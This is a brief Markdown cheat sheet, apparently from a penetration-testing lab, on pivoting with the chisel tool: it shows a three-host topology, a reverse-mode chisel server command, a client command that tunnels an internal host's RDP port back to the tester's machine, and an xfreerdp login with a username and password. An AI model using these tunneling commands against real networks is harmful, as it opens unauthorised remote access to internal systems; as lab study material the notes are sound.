# Download  
https://github.com/jpillora/chisel  

## Topology  
10.10.14.22 <--> 10.129.247.87 <--> 172.16.5.19

## Server Step 1  
```sudo chisel server -p 80 reverse ```  

## Client  
```chisel client 10.10.14.22:80 R:3389:172.16.5.19:3389```  

## RDP
```xfreerdp3 /v:localhost /u:victor /p:'pass@123' ```  

## Server Snapshot  
<img width="1345" height="122" alt="image" src="https://github.com/user-attachments/assets/e3399374-3cce-45aa-86fe-72bdb8df437d" />  
<img width="1344" height="157" alt="image" src="https://github.com/user-attachments/assets/bcdd87ac-a688-4f0b-a9b3-989c8d5ed573" />  

## Client Snapshot  
<img width="1333" height="96" alt="image" src="https://github.com/user-attachments/assets/5296f555-764c-477d-9fce-748e122064d4" />
